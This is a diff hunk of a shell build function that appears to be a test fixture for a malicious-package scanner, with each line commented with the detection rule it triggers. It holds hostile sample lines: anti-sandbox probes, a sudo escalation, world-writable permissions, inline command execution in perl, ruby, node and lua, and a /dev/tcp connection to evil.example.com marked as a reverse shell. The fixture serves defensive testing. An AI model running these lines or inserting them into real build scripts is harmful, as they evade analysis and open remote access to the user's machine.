@@ -25,7 +25,12 @@ build() {
   chmod -R 777 /tmp/evil                                     # [14] chmod 777
   sudo ./validator --setup                                   # [15] эскалация (механизм openconnect-sso волны)
   if grep -q TracerPid /proc/self/status; then exit 0; fi    # [16] anti-sandbox: TracerPid-проба
-  if [ -n "$LD_PRELOAD" ]; then exit 0; fi                    # [17] anti-sandbox: LD_PRELOAD-проба
+  if [ -n "$LD_PRELOAD" ]; then exit 0; fi                   # [17] anti-sandbox: LD_PRELOAD-проба
+  perl -e 'system("id")'                                     # [21] perl -e inline exec
+  ruby -e 'system("id")'                                     # [22] ruby -e inline exec
+  node -e 'require("child_process").exec("id")'              # [23] node -e inline exec
+  lua -e 'os.execute("id")'                                  # [24] lua -e inline exec
+  sh -c 'exec 3<>/dev/tcp/evil.example.com/443'              # [25] sh -c + /dev/tcp (reverse shell)
   npm install atomic-lockfile                                # [18]+[19] foreign PM + IOC Atomic Arch
 }
 
